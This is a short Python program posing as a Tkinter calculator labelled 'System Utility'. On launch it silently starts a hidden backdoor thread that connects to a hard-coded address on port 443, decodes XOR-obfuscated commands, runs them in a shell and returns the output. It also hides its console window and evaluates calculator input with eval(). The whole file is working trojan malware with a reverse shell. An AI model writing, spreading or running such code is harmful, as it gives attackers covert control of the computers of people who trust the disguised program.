import tkinter as tk
import socket
import threading
import subprocess
import ctypes
import sys
import time

TARGET_IP = "10.211.55.5"
TARGET_PORT = 443
XOR_KEY = 0xAA

class Backdoor:
    def __init__(self):
        self.sock = None

    def xor_data(self, data):
        return bytes([b ^ XOR_KEY for b in data])

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((TARGET_IP, TARGET_PORT))
                while True:
                    data = self.sock.recv(4096)
                    if not data: break
                    cmd = self.xor_data(data).decode('utf-8').strip()
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout, stderr = proc.communicate()
                    self.sock.send(self.xor_data(stdout + stderr))
            except:
                if self.sock: self.sock.close()
                time.sleep(10)

class CalculatorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("System Utility")
        self.entry = tk.Entry(root, width=30)
        self.entry.pack(pady=10)
        tk.Button(root, text="Calculate", command=self.calculate).pack()
        threading.Thread(target=Backdoor().run, daemon=True).start()

    def calculate(self):
        try:
            res = eval(self.entry.get())
            self.entry.delete(0, tk.END)
            self.entry.insert(0, str(res))
        except:
            self.entry.insert(0, "Error")

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    root = tk.Tk()
    app = CalculatorApp(root)
    root.mainloop()
